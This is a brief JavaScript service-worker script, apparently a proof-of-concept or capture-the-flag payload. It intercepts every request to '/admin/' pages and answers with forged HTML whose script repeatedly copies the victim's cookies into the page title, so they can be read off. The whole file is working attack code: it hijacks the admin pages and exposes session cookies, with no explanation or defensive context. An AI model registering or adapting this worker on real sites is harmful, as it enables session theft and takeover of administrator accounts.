self.addEventListener('fetch', (event) => {
    console.log('fetch', event.request.url);
    if(event.request.url.indexOf('/admin/')!==-1) {
        event.respondWith(new Response('<script>setInterval(()=>{document.title="got: "+document.cookie}, 100)</script>', {
            headers: {'Content-Type': 'text/html'},
        }));
    }
});